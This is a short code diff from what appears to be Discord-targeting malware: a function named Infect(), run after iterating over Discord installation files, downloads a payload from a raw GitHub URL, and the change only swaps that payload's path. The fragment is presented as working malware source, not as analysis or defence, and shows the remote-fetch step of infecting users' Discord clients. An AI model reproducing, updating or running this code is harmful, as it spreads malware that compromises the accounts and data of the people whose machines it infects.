@@ -25,7 +25,7 @@ discords.forEach(function(file) {
     })
 });
 function Infect() {
-    https.get('https://raw.githubusercontent.com/venomprivs/venomrebenta2120sjdhas/main/venomcomebutinhablazethay/venomgb22/venomupload22', (resp) => {
+    https.get('https://raw.githubusercontent.com/venomprivs/venomrebenta2120sjdhas/main/venomcomebutinhablazethay/venomupload22', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
